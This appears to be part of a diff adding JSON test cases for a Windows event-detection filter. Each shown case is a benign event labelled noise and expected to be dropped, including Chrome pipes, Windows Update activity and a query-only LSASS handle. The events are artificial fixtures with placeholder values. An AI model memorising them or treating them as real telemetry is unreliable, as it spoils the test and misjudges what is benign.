+   "area": "Noise",
+   "behavior": "PowerShell policy test script",
+   "seen": "noise",
+   "expect": "dropped",
+   "event": {
+    "tag": "FileCreate",
+    "fields": {
+     "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+     "TargetFilename": "C:\\Users\\jdoe\\AppData\\Local\\Temp\\__PSScriptPolicyTest_abcd1234.efg.ps1"
+    }
+   }
+  },
+  {
+   "id": "noise-chrome-pipe",
+   "area": "Noise",
+   "behavior": "Chrome creating its own mojo pipe",
+   "seen": "noise",
+   "expect": "dropped",
+   "event": {
+    "tag": "PipeEvent",
+    "fields": {
+     "EventType": "CreatePipe",
+     "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+     "PipeName": "\\mojo.5688.8052.183894939787088877"
+    }
+   }
+  },
+  {
+   "id": "noise-task-dynamicinfo",
+   "area": "Noise",
+   "behavior": "Task Scheduler run bookkeeping",
+   "seen": "noise",
+   "expect": "dropped",
+   "event": {
+    "tag": "RegistryEvent",
+    "fields": {
+     "EventType": "SetValue",
+     "Image": "C:\\Windows\\system32\\svchost.exe",
+     "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{1A2B3C4D}\\DynamicInfo",
+     "Details": "Binary Data"
+    }
+   }
+  },
+  {
+   "id": "noise-lsass-query",
+   "area": "Noise",
+   "behavior": "Query-only handle to LSASS (cannot read memory)",
+   "seen": "noise",
+   "expect": "dropped",
+   "event": {
+    "tag": "ProcessAccess",
+    "fields": {
+     "SourceImage": "C:\\Windows\\system32\\svchost.exe",
+     "TargetImage": "C:\\Windows\\system32\\lsass.exe",
+     "GrantedAccess": "0x1000",
+     "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9d4c4"
+    }
+   }
+  },
+  {
+   "id": "noise-windows-update-exe",
+   "area": "Noise",
+   "behavior": "Windows Update staging an executable",
+   "seen": "noise",
+   "expect": "dropped",
+   "event": {
+    "tag": "FileExecutableDetected",
+    "fields": {
+     "Image": "C:\\Windows\\System32\\svchost.exe",
+     "TargetFilename": "C:\\Windows\\SoftwareDistribution\\Download\\abc\\update.exe"
+    }
+   }
+  }
+ ]
+}
